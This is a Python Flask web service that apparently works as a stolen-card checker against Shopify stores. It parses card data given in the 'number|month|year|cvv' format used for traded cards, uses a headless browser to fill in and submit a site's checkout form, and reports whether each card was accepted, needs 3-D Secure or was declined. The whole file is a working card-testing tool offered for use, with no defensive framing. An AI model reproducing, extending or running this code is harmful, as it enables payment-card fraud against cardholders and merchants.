import os, re, asyncio
from flask import Flask, request, jsonify
from playwright.async_api import async_playwright
app = Flask(__name__)

def extract_cc(text):
    m = re.search(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)
    if m:
        card, month, year, cvv = m.groups()
        if len(year)==2: year='20'+year
        return card, month, year, cvv
    return None,None,None,None

async def do_checkout(site, card, month, year, cvv):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=['--no-sandbox'])
        page = await browser.new_page()
        try:
            await page.goto(site, timeout=15000, wait_until='domcontentloaded')
            await page.goto(f"{site}/checkout", timeout=30000, wait_until='networkidle')
            await page.fill('input[name="checkout[credit_card][number]"]', card)
            await page.fill('input[name="checkout[credit_card][month]"]', month)
            await page.fill('input[name="checkout[credit_card][year]"]', year)
            await page.fill('input[name="checkout[credit_card][verification_value]"]', cvv)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(8000)
            url, content = page.url, await page.content()
            if 'thank_you' in url.lower() or 'order' in url.lower():
                price = re.search(r'<span[^>]*data-total-price[^>]*>([\d.]+)</span>', content)
                return {"Response":"Order placed","Price":float(price.group(1)) if price else 0,"Gateway":"Shopify"}
            elif any(x in content.lower() for x in ['3d','authenticate','verification']):
                return {"Response":"3DS_REQUIRED","Price":0,"Gateway":"Shopify"}
            else:
                err = re.search(r'<p[^>]*class="error"[^>]*>(.*?)</p>', content, re.DOTALL)
                return {"Response":err.group(1).strip() if err else "Declined","Price":0,"Gateway":"Shopify"}
        except Exception as e:
            return {"Response":f"Error: {str(e)[:80]}","Price":0,"Gateway":"Shopify"}
        finally:
            await browser.close()

@app.route('/shopify', methods=['GET'])
def shopify():
    site, cc = request.args.get('site'), request.args.get('cc')
    if not site or not cc: return jsonify({"Response":"Missing site/cc","Price":0,"Gateway":"Shopify"}),400
    card, month, year, cvv = extract_cc(cc)
    if not card: return jsonify({"Response":"Invalid cc","Price":0,"Gateway":"Shopify"}),400
    if not site.startswith('http'): site = 'https://'+site
    return jsonify(asyncio.run(do_checkout(site, card, month, year, cvv)))

@app.route('/health')
def health(): return jsonify({"status":"ok"})
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT',8080)))
